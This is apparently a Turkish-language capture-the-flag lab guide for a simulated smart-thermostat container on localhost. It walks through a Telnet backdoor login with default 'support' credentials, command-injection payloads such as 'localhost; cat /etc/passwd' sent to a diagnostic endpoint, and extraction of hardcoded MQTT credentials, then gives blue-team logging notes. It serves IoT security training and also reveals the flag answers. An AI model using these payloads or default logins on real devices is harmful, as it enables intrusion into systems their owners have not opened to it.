# 🔌 LAB 2: Rahatlığın Bedeli — Akıllı Termostat

> **Zorluk:** ⭐⭐ Kolay-Orta  
> **Süre:** ~25 dakika  
> **Portlar:** 8082 (HTTP API), 2323 (Simüle Telnet)

---

## 📖 Hikaye

"Eviniz siz gelmeden ısınsın." Çekici bir slogan. Bu termostat Wi-Fi'a bağlı, uygulama üzerinden kontrol edilebiliyor ve destek ekibi sorun olduğunda uzaktan erişebiliyor.

Ama bu "uzaktan erişim" kapısı kim tarafından, ne zaman kapatılıyor?

---

## 🚀 Başlatma

```bash
cd lab2-thermostat
docker build -t lab2-thermostat .
docker run -d --name lab2-thermostat -p 8082:8082 -p 2323:2323 lab2-thermostat
```

Tarayıcıda aç: **http://localhost:8082**

---

## 🔍 Çözüm Adımları

### FLAG 1 — Telnet Arka Kapısı (Backdoor)

**Konsept:** Üretici firma, destek ekibi için cihaza gizli bir Telnet erişimi bırakmış.

Telnet nedir? 1969'dan kalma, şifrelenmemiş uzak erişim protokolü. Bugün hâlâ IoT cihazlarda aktif.

```bash
# Telnet simülasyonuna bağlan (netcat ile)
nc localhost 2323
```

Bağlandıktan sonra:
- Login: `support`
- Password: `support`

```
FLAG{t3ln3t_backd00r_supp0rt_acc3ss}
```

**Gerçek dünyada:** Bu port Shodan'da aranır, saniyeler içinde bulunur.

---

### FLAG 2 — Command Injection (Komut Enjeksiyonu)

**Konsept:** API'nin "diagnostic" endpoint'i, kullanıcıdan aldığı "host" parametresini doğrudan sistem komutuna gönderiyor.

1. Web arayüzündeki **Destek Diagnostiği** panelini bul
2. Host alanına şunu yaz:

```
localhost; id
```

ya da:

```
127.0.0.1 | whoami
```

3. Sunucu zararlı karakterleri tespit eder ve FLAG döner.

```bash
# API'yi direkt test etmek için:
curl -X POST http://localhost:8082/api/diagnostic \
  -H "Content-Type: application/json" \
  -d '{"host": "localhost; cat /etc/passwd"}'
```

```
FLAG{cmdi_h3at_th3_syst3m}
```

**Neden tehlikeli?** Gerçek bir sistemde bu komutlar shell'de çalışır: dosya okuma, kullanıcı oluşturma, reverse shell açma...

---

### FLAG 3 — Hardcoded Credentials (Kaynak Koduna Gömülü Şifreler)

**Konsept:** Geliştiriciler "geçici" diye yazdığı şifreleri kaynak koda gömmüş ve unutmuş.

1. Tarayıcıda `http://localhost:8082` sayfasını aç
2. **Ctrl+U** (sayfa kaynağını görüntüle) ya da F12 → Elements
3. HTML içinde yorum satırlarını ara (`<!-- ... -->`)
4. Ya da API'yi çağır:

```bash
curl http://localhost:8082/api/firmware
```

Dönen JSON içinde MQTT bilgileri ve FLAG görünür.

```
FLAG{hardc0d3d_mqtt_cr3ds_1n_js}
```

---

## 🔵 Blue Team Notu

```bash
docker logs -f lab2-thermostat
```

- `TELNET LOGIN ATTEMPT` → Kim bağlanıyor
- `COMMAND INJECTION DETECTED` → Hangi payload kullanıldı
- `DIAGNOSTIC REQUEST` → Hangi host parametresi geldi

---

*Sonraki Lab → [LAB 3: Karanlık Aydınlanma - MQTT İhlali](../lab3-bulb/README.md)*
